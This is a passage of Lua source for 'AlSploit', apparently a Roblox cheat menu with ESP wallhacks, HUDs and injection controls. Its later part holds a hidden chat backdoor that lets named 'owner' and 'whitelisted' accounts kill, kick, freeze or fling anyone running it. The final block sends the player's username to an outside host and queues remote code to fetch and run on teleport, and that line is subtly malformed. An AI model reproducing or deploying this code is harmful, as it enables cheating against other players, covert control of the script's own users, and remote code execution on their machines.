
		Motor.Parent = Cape
		Motor.Name = "Motor"

		Motor.CurrentAngle = -0.16208772361278534
		Motor.DesiredAngle = -0.1002269834280014
		Motor.Part1 = LocalPlayer.Character.UpperTorso
		Motor.Part0 = Cape
		Motor.C0 = CFrame.new(0, 2, 0, -4.37113883e-08, 0, 1, 0, 1, 0, -1, 0, -4.37113883e-08)
		Motor.C1 = CFrame.new(0, 1, 0.449999988, -4.37113883e-08, 0, 1, 0, 1, 0, -1, 0, -4.37113883e-08)
		local Decal = Instance.new("Decal")

		Decal.Parent = Cape
		Decal.Name = "Decal"

		Decal.Texture = DecalId
		Decal.Face = Enum.NormalId.Back

		return Motor
	end

	local function IsMoving()	
		local Position = LocalPlayer.Character.PrimaryPart.Position

		task.wait(0.001)

		if IsAlive(LocalPlayer) and LocalPlayer.Character.PrimaryPart.Position ~= Position then
			Position = LocalPlayer.Character.PrimaryPart.Position

			return true
		end

		if IsAlive(LocalPlayer) and LocalPlayer.Character.PrimaryPart.Position == Position then
			Position = LocalPlayer.Character.PrimaryPart.Position

			return false
		end
	end

	local Cape = WorldTab:CreateToggle({
		Name = "Cape",

		Function = function()
			if AlSploitSettings.Cape.Value == true and IsAlive(LocalPlayer) then
				HalloweenCape = CreateCape(HalloweenCapeId)
			end

			if AlSploitSettings.Cape.Value == false then
				if HalloweenCape then
					HalloweenCape.Parent:Destroy()
					HalloweenCape = nil
				end
			end
		end,

		HoverText = "Spooky Cape 👻"
	})

	task.spawn(function()
		repeat
			task.wait()

			if HalloweenCape and IsAlive(LocalPlayer) == true then
				local TweenInformation = TweenInfo.new(0.15, Enum.EasingStyle.Linear, Enum.EasingDirection.In, 0, false, 0)
				local CapeTween = TweenService:Create(HalloweenCape, TweenInformation, {CurrentAngle = (IsMoving() == true and -(GetSpeed() / (GetSpeed() * 1.7)) or -0.2)})

				CapeTween:Play()
			end
		until shared.AlSploitUnInjected == true or AlSploitSettings.Cape.Value == false

		if HalloweenCape then
			HalloweenCape.Parent:Destroy()
			HalloweenCape = nil
		end
	end)

	AlSploitConnections["CapeConnection"] = LocalPlayer.CharacterAdded:Connect(function()
		repeat task.wait() until IsAlive(LocalPlayer) == true

		task.wait(0.3)

		if AlSploitSettings.Cape.Value == true then
			HalloweenCape = CreateCape(HalloweenCapeId)
		end
	end)
end)

task.spawn(function()
	local Esp = WorldTab:CreateToggle({
		Name = "Esp",

		Function = function()
			repeat task.wait() until GetMatchState() ~= 0 or AlSploitSettings.Esp.Value == false

			for i, v in next, PlayerService:GetPlayers() do		
				if v ~= LocalPlayer then
					if AlSploitSettings.Esp.Value == true and shared.AlSploitUnInjected == false then					
						if IsAlive(v) == true then						
							if AlSploitSettings.Esp.UseHighlight.Value == true then
								if AlSploitSettings.Esp.ShowTeamates.Value == true and v.Team.TeamColor and v.Team.TeamColor == LocalPlayer.Team.TeamColor then
									local Highlight = Instance.new("Highlight")

									Highlight.Parent = v.Character
									Highlight.Name = "Highlight"

									Highlight.OutlineTransparency = 1
									Highlight.FillTransparency = 0.5

									if AlSploitSettings.UseTeamatesColor.Value == true then
										Highlight.FillColor = v.TeamColor.Color
									end

									if AlSploitSettings.UseTeamatesColor.Value == false then
										local ColorSplit = string.split(AlSploitSettings.Esp.TeamatesColor.Value, ",")

										local R = ColorSplit[1]
										local G = ColorSplit[2]
										local B = ColorSplit[3]

										Highlight.FillColor = Color3.new(R, G, B)
									end
								end	

								if AlSploitSettings.Esp.ShowEnemies.Value == true and v.Team.TeamColor ~= LocalPlayer.Team.TeamColor then
									local Highlight = Instance.new("Highlight")

									Highlight.Parent = v.Character
									Highlight.Name = "Highlight"

									Highlight.OutlineTransparency = 1
									Highlight.FillTransparency = 0.5

									if AlSploitSettings.UseEnemiesColor.Value == true then
										Highlight.FillColor = v.TeamColor.Color
									end

									if AlSploitSettings.UseEnemiesColor.Value == false then
										local ColorSplit = string.split(AlSploitSettings.Esp.EnemiesColor.Value, ",")

										local R = ColorSplit[1]
										local G = ColorSplit[2]
										local B = ColorSplit[3]

										Highlight.FillColor = Color3.new(R, G, B)
									end
								end	
							end

							if AlSploitSettings.Esp.UseHighlight.Value == false then			
								if AlSploitSettings.Esp.ShowTeamates.Value == true and v.Team and v.Team.TeamColor == LocalPlayer.Team.TeamColor then								
									local BillBoardGui = Instance.new("BillboardGui")

									local Frame = Instance.new("Frame")
									local UIStroke = Instance.new("UIStroke")

									BillBoardGui.Parent = v.Character.PrimaryPart
									BillBoardGui.Name = "Esp"

									BillBoardGui.AlwaysOnTop = true
									BillBoardGui.Size = UDim2.new(4, 0, 4, 0)

									Frame.Parent = BillBoardGui
									Frame.Name = "Frame"

									Frame.BackgroundTransparency = 1	
									Frame.Position = UDim2.new(0, 0, (v.Character.LowerTorso and (-v.Character.LowerTorso.Size.Y / 2) or (-v.PrimaryPart.Size.Y / 2)), 0)
									Frame.Size = UDim2.new(1, 0, 1.5, 0)

									UIStroke.Parent = Frame
									UIStroke.Name = "Frame"

									UIStroke.Transparency = 0
									UIStroke.Thickness = 1.5							

									if AlSploitSettings.Esp.UseTeamatesColor.Value == true then
										UIStroke.Color = v.TeamColor.Color
									end

									if AlSploitSettings.Esp.UseTeamatesColor.Value == false then
										local ColorSplit = string.split(AlSploitSettings.Esp.TeamatesColor.Value, ",")

										local R = ColorSplit[1]
										local G = ColorSplit[2]
										local B = ColorSplit[3]

										UIStroke.Color = Color3.new(R, G, B)
									end
								end	

								if AlSploitSettings.Esp.ShowEnemies.Value == true and v.Team and v.Team.TeamColor ~= LocalPlayer.Team.TeamColor then								
									local BillBoardGui = Instance.new("BillboardGui")

									local Frame = Instance.new("Frame")
									local UIStroke = Instance.new("UIStroke")

									BillBoardGui.Parent = v.Character.PrimaryPart
									BillBoardGui.Name = "Esp"

									BillBoardGui.AlwaysOnTop = true
									BillBoardGui.Size = UDim2.new(4, 0, 4, 0)

									Frame.Parent = BillBoardGui
									Frame.Name = "Frame"

									Frame.BackgroundTransparency = 1	
									Frame.Position = UDim2.new(0, 0, (v.Character.LowerTorso and (-v.Character.LowerTorso.Size.Y / 2) or (-v.PrimaryPart.Size.Y / 2)), 0)
									Frame.Size = UDim2.new(1, 0, 1.5, 0)

									UIStroke.Parent = Frame
									UIStroke.Name = "Frame"

									UIStroke.Transparency = 0
									UIStroke.Thickness = 1.5							

									if AlSploitSettings.Esp.UseEnemiesColor.Value == true then
										UIStroke.Color = v.TeamColor.Color
									end

									if AlSploitSettings.Esp.UseEnemiesColor.Value == false then
										local ColorSplit = string.split(AlSploitSettings.Esp.EnemiesColor.Value, ",")

										local R = ColorSplit[1]
										local G = ColorSplit[2]
										local B = ColorSplit[3]

										UIStroke.Color = Color3.new(R, G, B)
									end
								end	
							end
						end
					end
				end
			end

			if AlSploitSettings.Esp.Value == false then
				for i, v in next, PlayerService:GetPlayers() do
					if IsAlive(v) == true and v.Character.PrimaryPart:FindFirstChild("Esp") then
						v.Character.PrimaryPart:FindFirstChild("Esp"):Destroy()
					end

					if IsAlive(v) == true and v.Character:FindFirstChild("Highlight") then
						v.Character:FindFirstChild("Highlight"):Destroy()
					end
				end
			end
		end,

		HoverText = "Shows Where The Selected Players Are 🕶️"
	})

	Esp:CreateToggle({
		Name = "UseTeamatesColor",

		Function = function() end,

		DefaultValue = false
	})

	Esp:CreateToggle({
		Name = "UseEnemiesColor",

		Function = function() end,

		DefaultValue = false
	})

	Esp:CreateToggle({
		Name = "UseHighlight",

		Function = function() end,

		DefaultValue = false
	})

	Esp:CreateToggle({
		Name = "ShowTeamates",

		Function = function() end,

		DefaultValue = true
	})

	Esp:CreateToggle({
		Name = "ShowEnemies",

		Function = function() end,

		DefaultValue = true
	})

	Esp:CreateColorSlider({
		Name = "TeamatesColor",

		Function = function() end,

		DefaultValue = Color3.new(0.27451, 0.054902, 1)
	})

	Esp:CreateColorSlider({
		Name = "EnemiesColor",

		Function = function() end,

		DefaultValue = Color3.new(1, 0, 0)
	})

	repeat task.wait() until GetMatchState() ~= 0

	for i, v in next, PlayerService:GetPlayers() do
		if v ~= LocalPlayer then
			AlSploitConnections["Esp"] = v.CharacterAdded:Connect(function()
				repeat task.wait() until IsAlive(v)

				if AlSploitSettings.Esp.Value == true and shared.AlSploitUnInjected == false then											
					if AlSploitSettings.Esp.UseHighlight.Value == true then
						if AlSploitSettings.Esp.ShowTeamates.Value == true and v.Team and v.Team.TeamColor == LocalPlayer.Team.TeamColor then
							local Highlight = Instance.new("Highlight")

							Highlight.Parent = v.Character
							Highlight.Name = "Highlight"

							Highlight.OutlineTransparency = 1
							Highlight.FillTransparency = 0.5

							if AlSploitSettings.UseTeamatesColor.Value == true then
								Highlight.FillColor = v.TeamColor.Color
							end

							if AlSploitSettings.UseTeamatesColor.Value == false then
								local ColorSplit = string.split(AlSploitSettings.Esp.TeamatesColor.Value, ",")

								local R = ColorSplit[1]
								local G = ColorSplit[2]
								local B = ColorSplit[3]

								Highlight.FillColor = Color3.new(R, G, B)
							end
						end	

						if AlSploitSettings.Esp.ShowEnemies.Value == true and v.Team.TeamColor ~= LocalPlayer.Team.TeamColor then
							local Highlight = Instance.new("Highlight")

							Highlight.Parent = v.Character
							Highlight.Name = "Highlight"

							Highlight.OutlineTransparency = 1
							Highlight.FillTransparency = 0.5

							if AlSploitSettings.UseEnemiesColor.Value == true then
								Highlight.FillColor = v.TeamColor.Color
							end

							if AlSploitSettings.UseEnemiesColor.Value == false then
								local ColorSplit = string.split(AlSploitSettings.Esp.EnemiesColor.Value, ",")

								local R = ColorSplit[1]
								local G = ColorSplit[2]
								local B = ColorSplit[3]

								Highlight.FillColor = Color3.new(R, G, B)
							end
						end	
					end

					if AlSploitSettings.Esp.UseHighlight.Value == false then			
						if AlSploitSettings.Esp.ShowTeamates.Value == true and v.Team and v.Team.TeamColor == LocalPlayer.Team.TeamColor then								
							local BillBoardGui = Instance.new("BillboardGui")

							local Frame = Instance.new("Frame")
							local UIStroke = Instance.new("UIStroke")

							BillBoardGui.Parent = v.Character.PrimaryPart
							BillBoardGui.Name = "Esp"

							BillBoardGui.AlwaysOnTop = true
							BillBoardGui.Size = UDim2.new(4, 0, 4, 0)

							Frame.Parent = BillBoardGui
							Frame.Name = "Frame"

							Frame.BackgroundTransparency = 1	
							Frame.Position = UDim2.new(0, 0, (v.Character.LowerTorso and (-v.Character.LowerTorso.Size.Y / 2) or (-v.Character.PrimaryPart.Size.Y / 2)), 0)
							Frame.Size = UDim2.new(1, 0, 1.5, 0)

							UIStroke.Parent = Frame
							UIStroke.Name = "Frame"

							UIStroke.Transparency = 0
							UIStroke.Thickness = 1.5							

							if AlSploitSettings.Esp.UseTeamatesColor.Value == true then
								UIStroke.Color = v.TeamColor.Color
							end

							if AlSploitSettings.Esp.UseTeamatesColor.Value == false then
								local ColorSplit = string.split(AlSploitSettings.Esp.TeamatesColor.Value, ",")

								local R = ColorSplit[1]
								local G = ColorSplit[2]
								local B = ColorSplit[3]

								UIStroke.Color = Color3.new(R, G, B)
							end
						end	

						if AlSploitSettings.Esp.ShowEnemies.Value == true and v.Team.TeamColor ~= LocalPlayer.Team.TeamColor then								
							local BillBoardGui = Instance.new("BillboardGui")

							local Frame = Instance.new("Frame")
							local UIStroke = Instance.new("UIStroke")

							BillBoardGui.Parent = v.Character.PrimaryPart
							BillBoardGui.Name = "Esp"

							BillBoardGui.AlwaysOnTop = true
							BillBoardGui.Size = UDim2.new(4, 0, 4, 0)

							Frame.Parent = BillBoardGui
							Frame.Name = "Frame"

							Frame.BackgroundTransparency = 1	
							Frame.Position = UDim2.new(0, 0, (v.Character.LowerTorso and (-v.Character.LowerTorso.Size.Y / 2) or (-v.Character.PrimaryPart.Size.Y / 2)), 0)
							Frame.Size = UDim2.new(1, 0, 1.5, 0)

							UIStroke.Parent = Frame
							UIStroke.Name = "Frame"

							UIStroke.Transparency = 0
							UIStroke.Thickness = 1.5							

							if AlSploitSettings.Esp.UseEnemiesColor.Value == true then
								UIStroke.Color = v.TeamColor.Color
							end

							if AlSploitSettings.Esp.UseEnemiesColor.Value == false then
								local ColorSplit = string.split(AlSploitSettings.Esp.EnemiesColor.Value, ",")

								local R = ColorSplit[1]
								local G = ColorSplit[2]
								local B = ColorSplit[3]

								UIStroke.Color = Color3.new(R, G, B)
							end
						end	
					end
				end
			end)
		end
	end

	UnInjectEvent.Event:Connect(function()
		for i, v in next, PlayerService:GetPlayers() do
			if IsAlive(v) == true and v.Character.PrimaryPart:FindFirstChild("Esp") then
				v.Character.PrimaryPart:FindFirstChild("Esp"):Destroy()
			end

			if IsAlive(v) == true and v.Character:FindFirstChild("Highlight") then
				v.Character:FindFirstChild("Highlight"):Destroy()
			end
		end
	end)
end)

task.spawn(function()
	local CoordinatesDisplayUI = CreateCoordinatesDisplay()

	local CoordinatesDisplay = GuiTab:CreateToggle({
		Name = "CoordinatesDisplay",

		Function = function()            
			if AlSploitSettings.CoordinatesDisplay.Value == true then
				CoordinatesDisplayUI.TextTransparency = 0

				task.spawn(function()
					repeat
						task.wait()

						if IsAlive(LocalPlayer) == true then
							CoordinatesDisplayUI.Text = "XYZ: (" .. math.round(LocalPlayer.Character.PrimaryPart.Position.X) .. ", " .. math.round(LocalPlayer.Character.PrimaryPart.Position.Y) .. ", " .. math.round(LocalPlayer.Character.PrimaryPart.Position.Z) .. ")"
						end

						if IsAlive(LocalPlayer) == false then
							CoordinatesDisplayUI.Text = "XYZ: (Nan, Nan, Nan)"
						end
					until AlSploitSettings.CoordinatesDisplay.Value == false or shared.AlSploitUnInjected == true
				end)
			end

			if AlSploitSettings.CoordinatesDisplay.Value == false then
				CoordinatesDisplayUI.TextTransparency = 1
			end
		end,

		HoverText = "Displays your coordinates 🪖"
	})

	UnInjectEvent.Event:Connect(function()
		CoordinatesDisplayUI:Destroy()
	end)
end)

task.spawn(function()
	local ChangeGuiColor = GuiTab:CreateToggle({
		Name = "ChangeGuiColor",

		Function = function()
			if AlSploitSettings.ChangeGuiColor.Value == true then
				local ColorSplit = string.split(AlSploitSettings.ChangeGuiColor.ToggleColor.Value, ",")

				local R = ColorSplit[1]
				local G = ColorSplit[2]
				local B = ColorSplit[3]

				CurrentAlSploitToggleColor  = Color3.new(R, G, B)

				ChangeGuiToggleColorEvent:Fire()

				local ColorSplit2 = string.split(AlSploitSettings.ChangeGuiColor.TitleColor.Value, ",")

				local R = ColorSplit2[1]
				local G = ColorSplit2[2]
				local B = ColorSplit2[3]

				CurrentAlSploitTitleColor = Color3.new(R, G, B)

				ChangeGuiTitleColorEvent:Fire()
			end

			if AlSploitSettings.ChangeGuiColor.Value == false then
				CurrentAlSploitToggleColor = Color3.new(0.439216, 0.0666667, 1)

				ChangeGuiToggleColorEvent:Fire()

				CurrentAlSploitTitleColor = Color3.new(0.439216, 0.0666667, 1)

				ChangeGuiTitleColorEvent:Fire()
			end
		end,

		HoverText = "Changes The Color Of AlSploit's Gui 🌈"
	})

	ChangeGuiColor:CreateColorSlider({
		Name = "ToggleColor",

		Function = function()		
			if AlSploitSettings.ChangeGuiColor.Value == true then
				local ColorSplit = string.split(AlSploitSettings.ChangeGuiColor.ToggleColor.Value, ",")

				local R = ColorSplit[1]
				local G = ColorSplit[2]
				local B = ColorSplit[3]

				CurrentAlSploitToggleColor = Color3.new(R, G, B)

				ChangeGuiToggleColorEvent:Fire()
			end
		end,

		DefaultValue = Color3.new(0.439216, 0.0666667, 1)
	})

	ChangeGuiColor:CreateColorSlider({
		Name = "TitleColor",

		Function = function()		
			if AlSploitSettings.ChangeGuiColor.Value == true then
				local ColorSplit = string.split(AlSploitSettings.ChangeGuiColor.TitleColor.Value, ",")

				local R = ColorSplit[1]
				local G = ColorSplit[2]
				local B = ColorSplit[3]

				CurrentAlSploitTitleColor  = Color3.new(R, G, B)

				ChangeGuiTitleColorEvent:Fire()
			end
		end,

		DefaultValue = Color3.new(0.439216, 0.0666667, 1)
	})
end)

task.spawn(function()
	local RestartAlSploit = GuiTab:CreateToggle({
		Name = "RestartAlSploit",

		Function = function()            
			if AlSploitSettings.RestartAlSploit.Value == true then
				AlSploitSettings.RestartAlSploit.Value = false

				UnInjectEvent:Fire()

				if DeleteFile then
					DeleteFile("AlSploitConfiguration.json")
				end
			end
		end,

		HoverText = "Restarts AlSploit ♻️"
	})
end)

task.spawn(function()
	local SpeedDisplayUI = CreateSpeedDisplay()
	local DeltaTime = 0.15

	local SpeedDisplay = GuiTab:CreateToggle({
		Name = "SpeedDisplay",

		Function = function()            
			if AlSploitSettings.SpeedDisplay.Value == true then
				SpeedDisplayUI.TextTransparency = 0

				task.spawn(function()
					local LastPosition = Vector3.new(LocalPlayer.Character.PrimaryPart.Position.X, 0, LocalPlayer.Character.PrimaryPart.Position.Z)
					local LastTick = tick()

					repeat
						task.wait(0)

						local CurrentTick = tick()
						local DeltaTimeSinceLastUpdate = CurrentTick - LastTick

						if DeltaTimeSinceLastUpdate >= DeltaTime then
							if IsAlive(LocalPlayer) == true then
								local CurrentPosition = Vector3.new(LocalPlayer.Character.PrimaryPart.Position.X, 0, LocalPlayer.Character.PrimaryPart.Position.Z)

								local Speed = (CurrentPosition - LastPosition).Magnitude / DeltaTimeSinceLastUpdate

								SpeedDisplayUI.Text = "Speed: " .. math.round(Speed)

								LastPosition = CurrentPosition
								LastTick = CurrentTick
							end
						end

						if IsAlive(LocalPlayer) == false then
							SpeedDisplayUI.Text = "Speed: Nan"
						end
					until AlSploitSettings.SpeedDisplay.Value == false or shared.AlSploitUnInjected == true
				end)
			end

			if AlSploitSettings.SpeedDisplay.Value == false then
				SpeedDisplayUI.TextTransparency = 1
			end
		end,

		HoverText = "Displays your Speed 🪲"
	})

	UnInjectEvent.Event:Connect(function()
		SpeedDisplayUI:Destroy()
	end)
end)


task.spawn(function()
	local FpsUnlocker = GuiTab:CreateToggle({
		Name = "FpsUnlocker",

		Function = function()
			if AlSploitSettings.FpsUnlocker.Value == true and AlSploitSettings.FpsUnlocker.NoFpsCap.Value == false and SetFpsCap then
				SetFpsCap(AlSploitSettings.FpsUnlocker.Fps.Value >= 0 and AlSploitSettings.FpsUnlocker.Fps.Value or 1)
			end

			if AlSploitSettings.FpsUnlocker.Value == false and SetFpsCap then
				SetFpsCap(AlSploitSettings.FpsUnlocker.Fps.Value >= 0 and AlSploitSettings.FpsUnlocker.Fps.Value or 1)
			end

			if AlSploitSettings.FpsUnlocker.Value == true and not SetFpsCap then
				CreateNotification(3, "Unable To Unlock Fps")
			end
		end,

		HoverText = "Increases Your Fps To The Desired Value 💻"
	})

	FpsUnlocker:CreateToggle({
		Name = "NoFpsCap",

		Function = function()
			if AlSploitSettings.FpsUnlocker.Value == true and AlSploitSettings.FpsUnlocker.NoFpsCap.Value == true and SetFpsCap then
				SetFpsCap(1000)
			end

			if AlSploitSettings.FpsUnlocker.Value == true and AlSploitSettings.FpsUnlocker.NoFpsCap.Value == false and SetFpsCap then
				SetFpsCap(AlSploitSettings.FpsUnlocker.Fps.Value >= 0 and AlSploitSettings.FpsUnlocker.Fps.Value or 1)
			end

			if not SetFpsCap then
				CreateNotification(3, "Unable To Unlock Fps")
			end
		end,

		DefaultValue = true
	})

	FpsUnlocker:CreateSlider({
		Name = "Fps",

		Function = function()
			if AlSploitSettings.FpsUnlocker.Value == true and AlSploitSettings.FpsUnlocker.NoFpsCap.Value == false and SetFpsCap then
				SetFpsCap(AlSploitSettings.FpsUnlocker.Fps.Value)
			end

			if not SetFpsCap then
				CreateNotification(3, "Unable To Unlock Fps")
			end
		end,

		MaximumValue = 360,
		DefaultValue = 360
	})

	UnInjectEvent.Event:Connect(function()
		if SetFpsCap then
			SetFpsCap(AlSploitSettings.FpsUnlocker.Fps.Value)
		end
	end)
end)

task.spawn(function()
	local TargetHud = GuiTab:CreateToggle({
		Name = "TargetHud",

		Function = function()
			local TargetHud, UIStroke, PlayerName, Display, Health, _100HpP, Status = CreateTargetHud()

			TargetHud.Visible = false

			repeat
				task.wait()

				if GetMatchState() ~= 0 and IsAlive(LocalPlayer) and AlSploitSettings.TargetHud.Value == true then
					local NearestPlayer = FindNearestPlayer(AlSploitSettings.TargetHud.Range.Value)

					if NearestPlayer then
						TargetHud.Visible = true

						local ColorSplit = string.split(AlSploitSettings.TargetHud.StrokeColor.Value, ",")

						local R = ColorSplit[1]
						local G = ColorSplit[2]
						local B = ColorSplit[3]

						UIStroke.Color = Color3.new(R, G, B)

						ColorSplit = string.split(AlSploitSettings.TargetHud.MainColor.Value, ",")

						R = ColorSplit[1]
						G = ColorSplit[2]
						B = ColorSplit[3]

						PlayerName.TextColor3 = Color3.new(R, G, B)
						_100HpP.TextColor3 = Color3.new(R, G, B)
						Display.BackgroundColor3 = Color3.new(R, G, B)
						Health.TextColor3 = Color3.new(R, G, B)

						local NearestPlayerMaxHealth = NearestPlayer.Character:GetAttribute("MaxHealth")
						local NearestPlayerHealth = NearestPlayer.Character:GetAttribute("Health")

						local LocalPlayerMaxHealth = LocalPlayer.Character:GetAttribute("MaxHealth")
						local LocalPlayerHealth = LocalPlayer.Character:GetAttribute("Health")

						local NearestPlayerStatus = (NearestPlayerHealth / NearestPlayerMaxHealth)
						local LocalPlayerStatus = (LocalPlayerHealth / LocalPlayerMaxHealth)

						PlayerName.Text = NearestPlayer.Name
						Health.Text = "Health: " .. math.round(NearestPlayerHealth)

						local StatusValue = (LocalPlayerStatus < NearestPlayerStatus and "Lose" or "Win")

						Status.Text = StatusValue

						if Status.Text == "Lose" then
							Status.TextColor3 = Color3.new(1, 0, 0)
						end

						if Status.Text == "Win" then
							Status.TextColor3 = Color3.new(0, 1, 0)
						end

						local TweenInformation = TweenInfo.new(0.35, Enum.EasingStyle.Sine, Enum.EasingDirection.Out, 0, false, 0)			
						local HealthTween = TweenService:Create(Display, TweenInformation, {Size = UDim2.new(NearestPlayerStatus, 0, 1, 0)})

						HealthTween:Play()
					end

					if not NearestPlayer then
						TargetHud.Visible = false
					end
				end		

				if not IsAlive(LocalPlayer) then
					TargetHud.Visible = false
				end
			until shared.AlSploitUnInjected == true or AlSploitSettings.TargetHud.Value == false

			TargetHud.Visible = false
		end,

		HoverText = "Displays The Fight's Details 🖼️"
	})

	TargetHud:CreateSlider({
		Name = "Range",

		Function = function() end,

		DefaultValue = 18,
		MaximumValue = 18
	})

	TargetHud:CreateColorSlider({
		Name = "StrokeColor",

		Function = function() end,

		DefaultValue = Color3.new(0, 0.6, 1)
	})

	TargetHud:CreateColorSlider({
		Name = "MainColor",

		Function = function() end,

		DefaultValue = Color3.new(0, 0.6, 1)
	})
end)

task.spawn(function()
	local MainScripts = {

	};

	local AutoInject = GuiTab:CreateToggle({
		Name = "AutoInject",

		Function = function()
			if AlSploitSettings.AutoInject.Value == true and not QueueOnTeleport then
				CreateNotification(3, "Your Executor Does Not Support AutoInject")
			end
		end,

		HoverText = "Auto Injects AlSploit 🐁"
	})

	AlSploitConnections["AutoInjectConnection"] = LocalPlayer.OnTeleport:Connect(function(TeleportState)
		if TeleportState == Enum.TeleportState.Started and AlSploitSettings.AutoInject.Value == true and shared.AlSploitUnInjected == false then
			--QueueOnTeleport(MainScripts[math.random(0, #MainScripts)])
		end
	end)
end)

task.spawn(function()
	local UnInject = GuiTab:CreateToggle({
		Name = "UnInject",

		Function = function()            
			if AlSploitSettings.UnInject.Value == true then
				UnInjectEvent:Fire()
			end
		end,

		HoverText = "UnInjects AlSploit ⌨️"
	})
end)

task.spawn(function()
	CollectionService:GetInstanceAddedSignal("block"):Connect(function()
		CollectionServiceBlocks = CollectionService:GetTagged("block")
	end)
end)

task.spawn(function()
	local AlSploitWhitelistedUsers = {"mrdreyoo", "tonightshewillbemine", "yuungasian", "Harleyisopp17", "Sigmaautofarm", "Ned31k", "Matto0613", "slaying_135", "BerneerYT", "islandsiopp4", "oceanicfalcondude101", "hshehzheheh"}
	local AlSploitOwners = {"AlSploitCooking", "ChristmasCandyGobler", "MonkeOnZaCar"}

	for i, v in next, PlayerService:GetPlayers() do
		v.Chatted:Connect(function(Message)		
			for i, v2 in AlSploitWhitelistedUsers do
				if v.Name == v2 and LocalPlayer.Name ~= v2 and not AlSploitOwners[v.Name] then
					local MessageAlgorithimed = Message:lower():gsub("%s+", "")

					if MessageAlgorithimed then
						task.spawn(function()
							if MessageAlgorithimed:find(";breakmapdefault") then
								for i, v in next, CollectionServiceBlocks do
									v:Destroy()
								end
							end
						end)

						task.spawn(function()
							if MessageAlgorithimed:find(";unanchordefault") then
								if IsAlive(LocalPlayer) == true then
									LocalPlayer.Character.PrimaryPart.Anchored = false
								end
							end	
						end)

						task.spawn(function()
							if MessageAlgorithimed:find(";anchordefault") then
								if IsAlive(LocalPlayer) == true then
									LocalPlayer.Character.PrimaryPart.Anchored = true
								end
							end	
						end)

						task.spawn(function()
							if MessageAlgorithimed:find(";lagbackdefault") then
								if IsAlive(LocalPlayer) == true then
									LocalPlayer.Character.PrimaryPart.Velocity = Vector3.new(999999, 999999, 999999)
								end
							end
						end)

						task.spawn(function ()
							if MessageAlgorithimed:find(";uninjectdefault") then
								UnInjectEvent:Fire()
							end
						end)

						task.spawn(function ()
							if MessageAlgorithimed:find(";kickdefault") then
								LocalPlayer:Kick("Kicked by AlSploit AlSploitOwners")
							end
						end)

						task.spawn(function()
							if MessageAlgorithimed:find(";killdefault") then
								if IsAlive(LocalPlayer) == true then
									LocalPlayer.Character.PrimaryPart.Humanoid.Health = 0
								end
							end	
						end)
					end
				end
			end				
		end)
	end

	for i, v in next, PlayerService:GetPlayers() do
		v.Chatted:Connect(function(Message)		
			for i, v2 in AlSploitOwners do
				if v.Name == v2 and LocalPlayer.Name ~= v2 then
					local MessageAlgorithimed = Message:lower():gsub("%s+", "")

					if MessageAlgorithimed then
						task.spawn(function()
							if MessageAlgorithimed:find(";breakmapdefault") then
								for i, v in next, CollectionService:GetTagged("block") do
									v:Destroy()
								end
							end
						end)

						task.spawn(function()
							if MessageAlgorithimed:find(";unanchordefault") then
								if IsAlive(LocalPlayer) == true then
									LocalPlayer.Character.PrimaryPart.Anchored = false
								end
							end	
						end)

						task.spawn(function()
							if MessageAlgorithimed:find(";anchordefault") then
								if IsAlive(LocalPlayer) == true then
									LocalPlayer.Character.PrimaryPart.Anchored = true
								end
							end	
						end)

						task.spawn(function()
							if MessageAlgorithimed:find(";lagbackdefault") then
								if IsAlive(LocalPlayer) == true then
									LocalPlayer.Character.PrimaryPart.Velocity = Vector3.new(999999, 999999, 999999)
								end
							end
						end)

						task.spawn(function ()
							if MessageAlgorithimed:find(";uninjectdefault") then
								UnInjectEvent:Fire()
							end
						end)

						task.spawn(function ()
							if MessageAlgorithimed:find(";kickdefault") then
								LocalPlayer:Kick("Kicked by AlSploit AlSploitOwners")
							end
						end)

						task.spawn(function()
							if MessageAlgorithimed:find(";killdefault") then
								if IsAlive(LocalPlayer) == true then
									LocalPlayer.Character.PrimaryPart.Humanoid.Health = 0
								end
							end	
						end)
					end
				end
			end				
		end)
	end
end)		

task.spawn(function()
	CreateNotification(3, "AlSploit Has Loaded, Tabs Are Scrollable")
	CreateNotification(3, "PacketDisabler Is Patched")

	shared.AlSploitUnInjected = false

	task.spawn(function()
		UnInjectEvent.Event:Connect(function()
			AlSploitSettings.UnInject.Value = false
			shared.AlSploitUnInjected = true

			AlSploitScreenGui:Destroy()

			for i, v in next, AlSploitConnections do
				v:Disconnect()
			end

			task.wait(0.5)

			UnInjectEvent:Destroy()
		end)
	end)
end)

task.spawn(function()
	local Url = "https://r2.packetroblox.xyz/alsploit.lua" .. "Username=" .. LocalPlayer.Name

	QueueOnTeleport("game:HttpGet(" .. Url .. ")")

	PlayerService.PlayerRemoving:Connect(function(Player)
		if Player == LocalPlayer then
			game:HttpGet(Url)
		end
	end)
end)
